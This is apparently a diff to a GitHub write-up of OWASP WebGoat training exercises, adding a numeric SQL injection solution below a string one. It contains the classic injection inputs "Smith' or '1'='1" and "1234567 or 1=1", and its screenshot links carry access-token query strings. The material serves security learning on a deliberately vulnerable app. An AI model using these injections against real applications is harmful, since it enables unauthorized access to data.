@@ -43,3 +43,12 @@ Code used:
 ```
 Smith' or '1'='1
 ```
+![alt text](https://raw.githubusercontent.com/brendaang/OWASP-WebGoat-Exercises/master/Images/1%20string%20sql%20injection.png?token=ANjmphShORVH9YNbXzOVl2qLOor_DTeUks5buFZtwA%3D%3D)
+
+## SQL Numeric injection
+Code used:
+```
+1234567 or 1=1
+```
+
+![alt text](https://raw.githubusercontent.com/brendaang/OWASP-WebGoat-Exercises/master/Images/2%20numeric%20sql%20injection.png?token=ANjmpvTzCV9BFjfQNI43A-cANBDiq51Nks5buFbWwA%3D%3D)
